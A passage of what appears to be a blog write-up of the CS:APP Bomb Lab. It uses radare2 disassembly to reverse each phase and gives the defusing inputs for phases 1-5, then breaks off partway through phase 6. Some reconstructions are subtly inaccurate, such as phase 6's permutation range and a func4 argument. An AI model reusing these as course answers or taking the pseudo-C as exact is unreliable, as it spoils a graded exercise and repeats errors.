+</code></pre></div><h2 id="lab2-bomb-lab">Lab2 Bomb-lab</h2>
+<blockquote>
+<p>Solve with radare2</p>
+</blockquote>
+<h3 id="phase-1">Phase 1</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_1
+[0x00400ee0]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e3a(x)
+┌ 28: sym.phase_1 (int64_t arg1);
+│           ; arg int64_t arg1 @ rdi
+│           0x00400ee0      4883ec08       sub rsp, 8
+│           0x00400ee4      be00244000     mov esi, str.Border_relations_with_Canada_have_never_been_better. ; 0x402400 ; &quot;Border relations with Canada have never been better.&quot; ; int64_t arg2
+│           0x00400ee9      e84a040000     call sym.strings_not_equal
+│           0x00400eee      85c0           test eax, eax
+│       ┌─&lt; 0x00400ef0      7405           je 0x400ef7
+│       │   0x00400ef2      e843050000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_1 @ 0x400ef0(x)
+│       └─&gt; 0x00400ef7      4883c408       add rsp, 8
+└           0x00400efb      c3             ret
+</code></pre><p>A simple strcmp</p>
+<pre tabindex="0"><code>Welcome to my fiendish little bomb. You have 6 phases with
+which to blow yourself up. Have a nice day!
+Border relations with Canada have never been better.
+Phase 1 defused. How about the next one?
+</code></pre><h3 id="phase-2">Phase 2</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_2
+[0x00400efc]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e56(x)
+┌ 69: sym.phase_2 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var int64_t var_4h @ rsp+0x4
+│           ; var int64_t var_18h @ rsp+0x18
+│           0x00400efc      55             push rbp
+│           0x00400efd      53             push rbx
+│           0x00400efe      4883ec28       sub rsp, 0x28
+│           0x00400f02      4889e6         mov rsi, rsp                ; int64_t arg2
+│           0x00400f05      e852050000     call sym.read_six_numbers
+│           0x00400f0a      833c2401       cmp dword [rsp], 1
+│       ┌─&lt; 0x00400f0e      7420           je 0x400f30
+│       │   0x00400f10      e825050000     call sym.explode_bomb
+..
+│      ││   ; CODE XREFS from sym.phase_2 @ 0x400f2c(x), 0x400f3a(x)
+│    ┌┌───&gt; 0x00400f17      8b43fc         mov eax, dword [rbx - 4]
+│    ╎╎││   0x00400f1a      01c0           add eax, eax
+│    ╎╎││   0x00400f1c      3903           cmp dword [rbx], eax
+│   ┌─────&lt; 0x00400f1e      7405           je 0x400f25
+│   │╎╎││   0x00400f20      e815050000     call sym.explode_bomb
+│   │╎╎││   ; CODE XREF from sym.phase_2 @ 0x400f1e(x)
+│   └─────&gt; 0x00400f25      4883c304       add rbx, 4
+│    ╎╎││   0x00400f29      4839eb         cmp rbx, rbp
+│    └────&lt; 0x00400f2c      75e9           jne 0x400f17
+│    ┌────&lt; 0x00400f2e      eb0c           jmp 0x400f3c
+│    │╎││   ; CODE XREF from sym.phase_2 @ 0x400f0e(x)
+│    │╎││   ; CODE XREF from sym.phase_2 @ +0x19(x)
+│    │╎└└─&gt; 0x00400f30      488d5c2404     lea rbx, [var_4h]
+│    │╎     0x00400f35      488d6c2418     lea rbp, [var_18h]
+│    │└───&lt; 0x00400f3a      ebdb           jmp 0x400f17
+│    │      ; CODE XREF from sym.phase_2 @ 0x400f2e(x)
+│    └────&gt; 0x00400f3c      4883c428       add rsp, 0x28
+│           0x00400f40      5b             pop rbx
+│           0x00400f41      5d             pop rbp
+└           0x00400f42      c3             ret
+</code></pre><p><code>read_six_numbers()</code> read from input string <code>char *s</code> with format <code>%d %d %d %d %d %d</code>, and saved numbers in an array on stack.</p>
+<p>The first <code>cmp</code> compare the first number with const int <code>1</code>. After that, the program fall into a loop, which compare <code>array[cur]</code> with <code>array[cur - 1] * 2</code>.</p>
+<p>Therefore, our input should be:</p>
+<pre tabindex="0"><code>Phase 1 defused. How about the next one?
+1 2 4 8 16 32
+That's number 2.  Keep going!
+</code></pre><h3 id="phase-3">Phase 3</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_3
+[0x00400f43]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e72(x)
+┌ 132: sym.phase_3 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var uint32_t var_8h @ rsp+0x8
+│           ; var uint32_t var_ch @ rsp+0xc
+│           0x00400f43      4883ec18       sub rsp, 0x18
+│           0x00400f47      488d4c240c     lea rcx, [var_ch]
+│           0x00400f4c      488d542408     lea rdx, [var_8h]           ;   ...
+│           0x00400f51      becf254000     mov esi, 0x4025cf           ; &quot;%d %d&quot; ; const char *format
+│           0x00400f56      b800000000     mov eax, 0
+│           0x00400f5b      e890fcffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
+│           0x00400f60      83f801         cmp eax, 1                  ; 1
+│       ┌─&lt; 0x00400f63      7f05           jg 0x400f6a
+│       │   0x00400f65      e8d0040000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_3 @ 0x400f63(x)
+│       └─&gt; 0x00400f6a      837c240807     cmp dword [var_8h], 7
+│       ┌─&lt; 0x00400f6f      773c           ja case.default.0x400f75
+│       │   0x00400f71      8b442408       mov eax, dword [var_8h]
+│       │   ;-- switch
+│       │   0x00400f75      ff24c5702440.  jmp qword [rax*8 + 0x402470] ; &quot;|\x0f@&quot; ; switch table (8 cases) at 0x402470
+│       │   ;-- case 0:                                                ; from 0x00400f75
+│       │   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│       │   0x00400f7c      b8cf000000     mov eax, 0xcf               ; 207
+│      ┌──&lt; 0x00400f81      eb3b           jmp 0x400fbe
+│      ││   ;-- case 2:                                                ; from 0x00400f75
+│      ││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│      ││   0x00400f83      b8c3020000     mov eax, 0x2c3              ; 707
+│     ┌───&lt; 0x00400f88      eb34           jmp 0x400fbe
+│     │││   ;-- case 3:                                                ; from 0x00400f75
+│     │││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│     │││   0x00400f8a      b800010000     mov eax, 0x100              ; 256
+│    ┌────&lt; 0x00400f8f      eb2d           jmp 0x400fbe
+│    ││││   ;-- case 4:                                                ; from 0x00400f75
+│    ││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│    ││││   0x00400f91      b885010000     mov eax, 0x185              ; 389
+│   ┌─────&lt; 0x00400f96      eb26           jmp 0x400fbe
+│   │││││   ;-- case 5:                                                ; from 0x00400f75
+│   │││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│   │││││   0x00400f98      b8ce000000     mov eax, 0xce               ; 206
+│  ┌──────&lt; 0x00400f9d      eb1f           jmp 0x400fbe
+│  ││││││   ;-- case 6:                                                ; from 0x00400f75
+│  ││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│  ││││││   0x00400f9f      b8aa020000     mov eax, 0x2aa              ; 682
+│ ┌───────&lt; 0x00400fa4      eb18           jmp 0x400fbe
+│ │││││││   ;-- case 7:                                                ; from 0x00400f75
+│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│ │││││││   0x00400fa6      b847010000     mov eax, 0x147              ; 327
+│ ────────&lt; 0x00400fab      eb11           jmp 0x400fbe
+│ │││││││   ;-- default:                                               ; from 0x400f75
+│ │││││││   ; CODE XREFS from sym.phase_3 @ 0x400f6f(x), 0x400f75(x)
+│ ││││││└─&gt; 0x00400fad      e888040000     call sym.explode_bomb
+..
+│ │││││││   ;-- case 1:                                                ; from 0x00400f75
+│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│ │││││││   0x00400fb9      b837010000     mov eax, 0x137              ; 311
+│ │││││││   ; XREFS: CODE 0x00400f81  CODE 0x00400f88  CODE 0x00400f8f  CODE 0x00400f96  CODE 0x00400f9d  CODE 0x00400fa4
+│ │││││││   ; XREFS: CODE 0x00400fab  CODE 0x00400fb7
+│ └└└└└└└─&gt; 0x00400fbe      3b44240c       cmp eax, dword [var_ch]
+│       ┌─&lt; 0x00400fc2      7405           je 0x400fc9
+│       │   0x00400fc4      e871040000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_3 @ 0x400fc2(x)
+│       └─&gt; 0x00400fc9      4883c418       add rsp, 0x18
+└           0x00400fcd      c3             ret
+</code></pre><p>First read 2 number from input (format is <code>%d %d</code>), and save them in <code>[var_8h], [var_ch]</code>.</p>
+<p>Number 1 in <code>[var_8h]</code> is used for a switch-case, and Number 2 in <code>[var_ch]</code> is used to compare with eax which set in case.</p>
+<p>Valid input:</p>
+<pre tabindex="0"><code>0 207
+1 311
+2 707
+3 256
+4 389
+5 206
+6 682
+7 327
+</code></pre><p>For example:</p>
+<pre tabindex="0"><code>That's number 2.  Keep going!
+7 327
+Halfway there!
+</code></pre><h3 id="phase-4">Phase 4</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_4
+[0x0040100c]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e8e(x)
+┌ 86: sym.phase_4 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var uint32_t var_8h @ rsp+0x8
+│           ; var uint32_t var_ch @ rsp+0xc
+│           0x0040100c      4883ec18       sub rsp, 0x18
+│           0x00401010      488d4c240c     lea rcx, [var_ch]
+│           0x00401015      488d542408     lea rdx, [var_8h]           ;   ...
+│           0x0040101a      becf254000     mov esi, 0x4025cf           ; &quot;%d %d&quot; ; const char *format
+│           0x0040101f      b800000000     mov eax, 0
+│           0x00401024      e8c7fbffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
+│           0x00401029      83f802         cmp eax, 2                  ; 2
+│       ┌─&lt; 0x0040102c      7507           jne 0x401035
+│       │   0x0040102e      837c24080e     cmp dword [var_8h], 0xe
+│      ┌──&lt; 0x00401033      7605           jbe 0x40103a
+│      ││   ; CODE XREF from sym.phase_4 @ 0x40102c(x)
+│      │└─&gt; 0x00401035      e800040000     call sym.explode_bomb
+│      │    ; CODE XREF from sym.phase_4 @ 0x401033(x)
+│      └──&gt; 0x0040103a      ba0e000000     mov edx, 0xe                ; 14 ; int64_t arg3
+│           0x0040103f      be00000000     mov esi, 0                  ; int64_t arg2
+│           0x00401044      8b7c2408       mov edi, dword [var_8h]     ; int64_t arg1
+│           0x00401048      e881ffffff     call sym.func4
+│           0x0040104d      85c0           test eax, eax
+│       ┌─&lt; 0x0040104f      7507           jne 0x401058
+│       │   0x00401051      837c240c00     cmp dword [var_ch], 0
+│      ┌──&lt; 0x00401056      7405           je 0x40105d
+│      ││   ; CODE XREF from sym.phase_4 @ 0x40104f(x)
+│      │└─&gt; 0x00401058      e8dd030000     call sym.explode_bomb
+│      │    ; CODE XREF from sym.phase_4 @ 0x401056(x)
+│      └──&gt; 0x0040105d      4883c418       add rsp, 0x18
+└           0x00401061      c3             ret
+
+
+[0x0040100c]&gt; s sym.func4
+[0x00400fce]&gt; pdf
+            ; CALL XREFS from sym.func4 @ 0x400fe9(x), 0x400ffe(x)
+            ; CALL XREF from sym.phase_4 @ 0x401048(x)
+┌ 62: sym.func4 (signed int arg1, int64_t arg2, int64_t arg3);
+│           ; arg signed int arg1 @ rdi
+│           ; arg int64_t arg2 @ rsi
+│           ; arg int64_t arg3 @ rdx
+│           0x00400fce      4883ec08       sub rsp, 8
+│           0x00400fd2      89d0           mov eax, edx                ; arg3
+│           0x00400fd4      29f0           sub eax, esi                ; arg2
+│           0x00400fd6      89c1           mov ecx, eax
+│           0x00400fd8      c1e91f         shr ecx, 0x1f
+│           0x00400fdb      01c8           add eax, ecx
+│           0x00400fdd      d1f8           sar eax, 1
+│           0x00400fdf      8d0c30         lea ecx, [rax + rsi]
+│           0x00400fe2      39f9           cmp ecx, edi                ; arg1
+│       ┌─&lt; 0x00400fe4      7e0c           jle 0x400ff2
+│       │   0x00400fe6      8d51ff         lea edx, [rcx - 1]
+│       │   0x00400fe9      e8e0ffffff     call sym.func4
+│       │   0x00400fee      01c0           add eax, eax
+│      ┌──&lt; 0x00400ff0      eb15           jmp 0x401007
+│      ││   ; CODE XREF from sym.func4 @ 0x400fe4(x)
+│      │└─&gt; 0x00400ff2      b800000000     mov eax, 0
+│      │    0x00400ff7      39f9           cmp ecx, edi                ; arg1
+│      │┌─&lt; 0x00400ff9      7d0c           jge 0x401007
+│      ││   0x00400ffb      8d7101         lea esi, [rcx + 1]
+│      ││   0x00400ffe      e8cbffffff     call sym.func4
+│      ││   0x00401003      8d440001       lea eax, [rax + rax + 1]
+│      ││   ; CODE XREFS from sym.func4 @ 0x400ff0(x), 0x400ff9(x)
+│      └└─&gt; 0x00401007      4883c408       add rsp, 8
+└           0x0040100b      c3             ret
+</code></pre><p>Still, read 2 numbers from input by <code>sscanf()</code>.</p>
+<p>The <code>func4()</code> should be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">func4</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> a2, <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> a3){
+    <span style="color:#66d9ef">int</span> ecx <span style="color:#f92672">=</span> a3 <span style="color:#f92672">-</span> a2;
+    ecx <span style="color:#f92672">+=</span> ecx <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span>;
+    ecx <span style="color:#f92672">=</span> (ecx <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> a2;
+    <span style="color:#66d9ef">if</span> (ecx <span style="color:#f92672">&gt;</span> a1) <span style="color:#66d9ef">return</span> func4(a1, a2, a3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+    <span style="color:#66d9ef">if</span> (ecx <span style="color:#f92672">&lt;</span> a1) <span style="color:#66d9ef">return</span> func4(a1, a2, a3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Our target is <code>func(input[0], 0, 14) == 0</code>, therefore <code>input[0]</code> should be <code>0</code> or <code>1</code>.</p>
+<p>Since <code>cmp dword [var_ch], 0</code>, <code>input[1]</code> should be <code>0</code>.</p>
+<pre tabindex="0"><code>Halfway there!
+1 0
+So you got that one.  Try this one.
+</code></pre><h3 id="phase-5">Phase 5</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_5
+[0x00401062]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400eaa(x)
+┌ 137: sym.phase_5 (int64_t arg1);
+│           ; arg int64_t arg1 @ rdi
+│           ; var int64_t var_10h @ rsp+0x10
+│           ; var int64_t var_16h @ rsp+0x16
+│           ; var int64_t canary @ rsp+0x18
+│           0x00401062      53             push rbx
+│           0x00401063      4883ec20       sub rsp, 0x20
+│           0x00401067      4889fb         mov rbx, rdi                ; arg1
+│           0x0040106a      64488b042528.  mov rax, qword fs:[0x28]
+│           0x00401073      4889442418     mov qword [canary], rax
+│           0x00401078      31c0           xor eax, eax
+│           0x0040107a      e89c020000     call sym.string_length
+│           0x0040107f      83f806         cmp eax, 6                  ; 6
+│       ┌─&lt; 0x00401082      744e           je 0x4010d2
+│       │   0x00401084      e8b1030000     call sym.explode_bomb
+..
+│      ││   ; CODE XREFS from sym.phase_5 @ 0x4010ac(x), 0x4010d7(x)
+│    ┌┌───&gt; 0x0040108b      0fb60c03       movzx ecx, byte [rbx + rax]
+│    ╎╎││   0x0040108f      880c24         mov byte [rsp], cl
+│    ╎╎││   0x00401092      488b1424       mov rdx, qword [rsp]
+│    ╎╎││   0x00401096      83e20f         and edx, 0xf                ; 15
+│    ╎╎││   0x00401099      0fb692b02440.  movzx edx, byte [rdx + obj.array.3449] ; [0x4024b0:1]=109 ; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;
+│    ╎╎││   0x004010a0      88540410       mov byte [rsp + rax + 0x10], dl
+│    ╎╎││   0x004010a4      4883c001       add rax, 1
+│    ╎╎││   0x004010a8      4883f806       cmp rax, 6                  ; 6
+│    └────&lt; 0x004010ac      75dd           jne 0x40108b
+│     ╎││   0x004010ae      c644241600     mov byte [var_16h], 0
+│     ╎││   0x004010b3      be5e244000     mov esi, str.flyers         ; 0x40245e ; &quot;flyers&quot; ; int64_t arg2
+│     ╎││   0x004010b8      488d7c2410     lea rdi, [var_10h]          ; int64_t arg1
+│     ╎││   0x004010bd      e876020000     call sym.strings_not_equal
+│     ╎││   0x004010c2      85c0           test eax, eax
+│    ┌────&lt; 0x004010c4      7413           je 0x4010d9
+│    │╎││   0x004010c6      e86f030000     call sym.explode_bomb
+..
+│   ││╎││   ; CODE XREF from sym.phase_5 @ 0x401082(x)
+│   ││╎││   ; CODE XREF from sym.phase_5 @ +0x27(x)
+│   ││╎└└─&gt; 0x004010d2      b800000000     mov eax, 0
+│   ││└───&lt; 0x004010d7      ebb2           jmp 0x40108b
+│   ││      ; CODE XREF from sym.phase_5 @ 0x4010c4(x)
+│   ││      ; CODE XREF from sym.phase_5 @ +0x6e(x)
+│   └└────&gt; 0x004010d9      488b442418     mov rax, qword [canary]
+│           0x004010de      644833042528.  xor rax, qword fs:[0x28]
+│       ┌─&lt; 0x004010e7      7405           je 0x4010ee
+│       │   0x004010e9      e842faffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+│       │   ; CODE XREF from sym.phase_5 @ 0x4010e7(x)
+│       └─&gt; 0x004010ee      4883c420       add rsp, 0x20
+│           0x004010f2      5b             pop rbx
+└           0x004010f3      c3             ret
+</code></pre><p>First, <code>string_length(input) == 6</code>.</p>
+<p>Fall into a loop:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>){
+    ecx <span style="color:#f92672">=</span> input[i];
+    edx <span style="color:#f92672">=</span> ecx <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>;
+    edx <span style="color:#f92672">=</span> maduiersnfotvbyl[edx];
+    var_10h[i] <span style="color:#f92672">=</span> edx;
+}
+strings_not_equal(var_10h[i], <span style="color:#e6db74">&#34;flyers&#34;</span>);
+</code></pre></div><p>So our input should be:</p>
+<pre tabindex="0"><code>0x?9 0x?f 0x?e 0x?5 0x?6 0x?7
+</code></pre><p>For easy to input, we can simply set <code>?</code> as <code>6</code>.</p>
+<pre tabindex="0"><code>So you got that one.  Try this one.
+ionefg
+Good work!  On to the next...
+</code></pre><h3 id="phase-6">Phase 6</h3>
+<pre tabindex="0"><code>[0x00400da0]&gt; s sym.phase_6
+[0x004010f4]&gt; pdf
+            ; CALL XREF from dbg.main @ 0x400ec6(x)
+┌ 272: sym.phase_6 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var int64_t var_18h @ rsp+0x18
+│           ; var int64_t var_20h @ rsp+0x20
+│           ; var int64_t var_28h @ rsp+0x28
+│           ; var int64_t var_50h @ rsp+0x50
+│           0x004010f4      4156           push r14
+│           0x004010f6      4155           push r13
+│           0x004010f8      4154           push r12
+│           0x004010fa      55             push rbp
+│           0x004010fb      53             push rbx
+│           0x004010fc      4883ec50       sub rsp, 0x50
+│           0x00401100      4989e5         mov r13, rsp
+│           0x00401103      4889e6         mov rsi, rsp                ; int64_t arg2
+│           0x00401106      e851030000     call sym.read_six_numbers
+│           0x0040110b      4989e6         mov r14, rsp
+│           0x0040110e      41bc00000000   mov r12d, 0
+│           ; CODE XREF from sym.phase_6 @ 0x401151(x)
+│       ┌─&gt; 0x00401114      4c89ed         mov rbp, r13
+│       ╎   0x00401117      418b4500       mov eax, dword [r13]
+│       ╎   0x0040111b      83e801         sub eax, 1
+│       ╎   0x0040111e      83f805         cmp eax, 5                  ; 5
+│      ┌──&lt; 0x00401121      7605           jbe 0x401128
+│      │╎   0x00401123      e812030000     call sym.explode_bomb
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x401121(x)
+│      └──&gt; 0x00401128      4183c401       add r12d, 1
+│       ╎   0x0040112c      4183fc06       cmp r12d, 6                 ; 6
+│      ┌──&lt; 0x00401130      7421           je 0x401153
+│      │╎   0x00401132      4489e3         mov ebx, r12d
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x40114b(x)
+│     ┌───&gt; 0x00401135      4863c3         movsxd rax, ebx
+│     ╎│╎   0x00401138      8b0484         mov eax, dword [rsp + rax*4]
+│     ╎│╎   0x0040113b      394500         cmp dword [rbp], eax
+│    ┌────&lt; 0x0040113e      7505           jne 0x401145
+│    │╎│╎   0x00401140      e8f5020000     call sym.explode_bomb
+│    │╎│╎   ; CODE XREF from sym.phase_6 @ 0x40113e(x)
+│    └────&gt; 0x00401145      83c301         add ebx, 1
+│     ╎│╎   0x00401148      83fb05         cmp ebx, 5                  ; 5
+│     └───&lt; 0x0040114b      7ee8           jle 0x401135
+│      │╎   0x0040114d      4983c504       add r13, 4
+│      │└─&lt; 0x00401151      ebc1           jmp 0x401114
+│      │    ; CODE XREF from sym.phase_6 @ 0x401130(x)
+│      └──&gt; 0x00401153      488d742418     lea rsi, [var_18h]
+│           0x00401158      4c89f0         mov rax, r14
+│           0x0040115b      b907000000     mov ecx, 7
+│           ; CODE XREF from sym.phase_6 @ 0x40116d(x)
+│       ┌─&gt; 0x00401160      89ca           mov edx, ecx
+│       ╎   0x00401162      2b10           sub edx, dword [rax]
+│       ╎   0x00401164      8910           mov dword [rax], edx
+│       ╎   0x00401166      4883c004       add rax, 4
+│       ╎   0x0040116a      4839f0         cmp rax, rsi
+│       └─&lt; 0x0040116d      75f1           jne 0x401160
+│           0x0040116f      be00000000     mov esi, 0
+│       ┌─&lt; 0x00401174      eb21           jmp 0x401197
+│       │   ; CODE XREFS from sym.phase_6 @ 0x40117f(x), 0x4011a9(x)
+│     ┌┌──&gt; 0x00401176      488b5208       mov rdx, qword [rdx + 8]
+│     ╎╎│   0x0040117a      83c001         add eax, 1
+│     ╎╎│   0x0040117d      39c8           cmp eax, ecx
+│     └───&lt; 0x0040117f      75f5           jne 0x401176
+│     ┌───&lt; 0x00401181      eb05           jmp 0x401188
+│     │╎│   ; CODE XREF from sym.phase_6 @ 0x40119d(x)
+│    ┌────&gt; 0x00401183      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &quot;L\x01&quot;
+│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401181(x)
+│    ╎└───&gt; 0x00401188      4889547420     mov qword [rsp + rsi*2 + 0x20], rdx
+│    ╎ ╎│   0x0040118d      4883c604       add rsi, 4
+│    ╎ ╎│   0x00401191      4883fe18       cmp rsi, 0x18               ; 24
+│    ╎┌───&lt; 0x00401195      7414           je 0x4011ab
+│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401174(x)
+│    ╎│╎└─&gt; 0x00401197      8b0c34         mov ecx, dword [rsp + rsi]
+│    ╎│╎    0x0040119a      83f901         cmp ecx, 1                  ; 1
+│    └────&lt; 0x0040119d      7ee4           jle 0x401183
+│     │╎    0x0040119f      b801000000     mov eax, 1
+│     │╎    0x004011a4      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &quot;L\x01&quot;
+│     │└──&lt; 0x004011a9      ebcb           jmp 0x401176
+│     │     ; CODE XREF from sym.phase_6 @ 0x401195(x)
+│     └───&gt; 0x004011ab      488b5c2420     mov rbx, qword [var_20h]
+│           0x004011b0      488d442428     lea rax, [var_28h]
+│           0x004011b5      488d742450     lea rsi, [var_50h]
+│           0x004011ba      4889d9         mov rcx, rbx
+│           ; CODE XREF from sym.phase_6 @ 0x4011d0(x)
+│       ┌─&gt; 0x004011bd      488b10         mov rdx, qword [rax]
+│       ╎   0x004011c0      48895108       mov qword [rcx + 8], rdx
+│       ╎   0x004011c4      4883c008       add rax, 8
+│       ╎   0x004011c8      4839f0         cmp rax, rsi
+│      ┌──&lt; 0x004011cb      7405           je 0x4011d2
+│      │╎   0x004011cd      4889d1         mov rcx, rdx
+│      │└─&lt; 0x004011d0      ebeb           jmp 0x4011bd
+│      │    ; CODE XREF from sym.phase_6 @ 0x4011cb(x)
+│      └──&gt; 0x004011d2      48c742080000.  mov qword [rdx + 8], 0
+│           0x004011da      bd05000000     mov ebp, 5
+│           ; CODE XREF from sym.phase_6 @ 0x4011f5(x)
+│       ┌─&gt; 0x004011df      488b4308       mov rax, qword [rbx + 8]
+│       ╎   0x004011e3      8b00           mov eax, dword [rax]
+│       ╎   0x004011e5      3903           cmp dword [rbx], eax
+│      ┌──&lt; 0x004011e7      7d05           jge 0x4011ee
+│      │╎   0x004011e9      e84c020000     call sym.explode_bomb
+│      │╎   ; CODE XREF from sym.phase_6 @ 0x4011e7(x)
+│      └──&gt; 0x004011ee      488b5b08       mov rbx, qword [rbx + 8]
+│       ╎   0x004011f2      83ed01         sub ebp, 1
+│       └─&lt; 0x004011f5      75e8           jne 0x4011df
+│           0x004011f7      4883c450       add rsp, 0x50
+│           0x004011fb      5b             pop rbx
+│           0x004011fc      5d             pop rbp
+│           0x004011fd      415c           pop r12
+│           0x004011ff      415d           pop r13
+│           0x00401201      415e           pop r14
+└           0x00401203      c3             ret
+</code></pre><p><code>read_six_numbers()</code> from input string.</p>
+<p>A loop:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> r12d <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; r12d <span style="color:#f92672">!=</span> <span style="color:#ae81ff">6</span>; r12d<span style="color:#f92672">++</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>r13 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) explode_bomb();
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> ebx <span style="color:#f92672">=</span> r12d; ebx <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">5</span>; ebx<span style="color:#f92672">++</span>) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>r13 <span style="color:#f92672">==</span> rsp[ebx]) explode_bomb();
+    }
+    r13 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>Therefore, 6 numbers must be a permutation of [0, 1, 2, 3, 4, 5].</p>
+<p>Calculations before check.</p>
+<p><code>num[i] = 7 - num[i]</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rax <span style="color:#f92672">=</span> rsp;
+<span style="color:#66d9ef">do</span> {
+    <span style="color:#f92672">*</span>rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> <span style="color:#f92672">*</span>rax;
+    rax <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+} <span style="color:#66d9ef">while</span>(rax <span style="color:#f92672">!=</span> rsp <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>);
+</code></pre></div><p>Re-sort the Nodes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> esi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; esi <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x18</span>; esi <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>) {
+    ecx <span style="color:#f92672">=</span> rsp[esi];
+    <span style="color:#66d9ef">if</span> (ecx <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1</span>) {
+        edx <span style="color:#f92672">=</span> node1;
+    }
+    <span style="color:#66d9ef">else</span> {
+        eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+        edx <span style="color:#f92672">=</span> node1;
+        <span style="color:#66d9ef">do</span> {
+            rdx <span style="color:#f92672">=</span> rdx.next;
+            eax <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+        } <span style="color:#66d9ef">while</span> (eax <span style="color:#f92672">!=</span> ecx);
+    }
+    var_20h[rsi <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> rdx;
+}
+</code></pre></div><p>Node is a One-way LinkedList</p>
+<pre tabindex="0"><code>node1
+    dd 14Ch 
+    dd 1
+    dq offset node2
+
+node2
+    dd 0A8h
+    dd 2
+    dq offset node3
+
+node3
+    dd 39Ch
+    dd 3
+    dq offset node4
+
+node4
+    dd 2B3h
+    dd 4
+    dq offset node5
+
+node5
+    dd 1DDh
+    dd 5
+    dq offset node6
+
+node6
+    dd 1BBh
+    dd 6
+    dq offset 0
+</code></pre><p>Re-linked.</p>
